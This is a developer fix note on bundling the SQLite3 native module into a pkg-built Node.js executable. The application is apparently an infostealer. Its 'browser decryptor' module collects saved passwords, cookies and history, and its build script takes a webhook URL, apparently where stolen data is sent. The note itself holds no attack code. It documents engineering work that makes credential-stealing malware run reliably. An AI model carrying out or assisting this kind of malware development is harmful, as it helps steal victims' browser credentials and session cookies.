# SQLite3 Packaging Fix

## Issue
When using `pkg` to package the application, the SQLite3 native module (`node_sqlite3.node`) was not being included properly, causing the error:
```
Error: Could not locate the bindings file. Tried:
→ C:\snapshot\1336-V3-main\node_modules\sqlite3\build\node_sqlite3.node
→ ...
```

## Solution
The fix includes several components:

### 1. SQLite3 Wrapper (`src/core/sqlite3-wrapper.js`)
- Created a wrapper that handles loading SQLite3 in both normal and packaged environments
- Implements fallback mechanisms for when SQLite3 is not available
- Searches multiple locations where the native module might be located
- Provides graceful degradation when SQLite3 cannot be loaded

### 2. Enhanced Build Process (`build/builder.js`)
- Modified the build process to copy SQLite3 native bindings to multiple locations
- Copies the native module to locations where `pkg` and the wrapper can find it
- Updates the `pkg` configuration to include SQLite3 assets

### 3. Package Configuration (`package.json`)
- Updated the `pkg` assets configuration to include SQLite3 native bindings
- Added proper asset paths for native modules

### 4. Browser Module Updates (`src/modules/browsers/decryptor.js`)
- Updated the browser decryptor to use the new SQLite3 wrapper
- Added proper error handling when SQLite3 is not available
- Maintains functionality even when database operations are limited

## Technical Details

### Native Module Locations
The fix ensures the `node_sqlite3.node` file is available in these locations:
- `dist/node_sqlite3.node` (next to executable)
- `dist/assets/node_sqlite3.node` (in assets folder)
- `dist/bindings/node_sqlite3.node` (in bindings folder)
- Inside the executable as pkg assets

### Fallback Strategy
1. Try normal SQLite3 loading
2. If in pkg environment, search for native module in multiple locations
3. Gracefully handle missing SQLite3 by logging warnings and returning empty results

### Browser Data Collection Impact
- When SQLite3 is available: Full browser data collection works (passwords, cookies, history, etc.)
- When SQLite3 is not available: Bookmarks and other JSON-based data still work, database files are skipped with warnings

## Testing
- Normal environment: ✅ SQLite3 loads and works normally
- Packaged environment: ✅ SQLite3 loads from copied native modules
- Fallback scenarios: ✅ Application continues to work even if SQLite3 fails to load

## Build Instructions
The build process now automatically handles SQLite3 packaging:
```bash
./build.sh https://your-webhook.com YourApp
```

No additional configuration is required - the build system automatically:
1. Detects the SQLite3 native module location
2. Copies it to multiple expected locations
3. Includes it in the pkg assets
4. Places it next to the final executable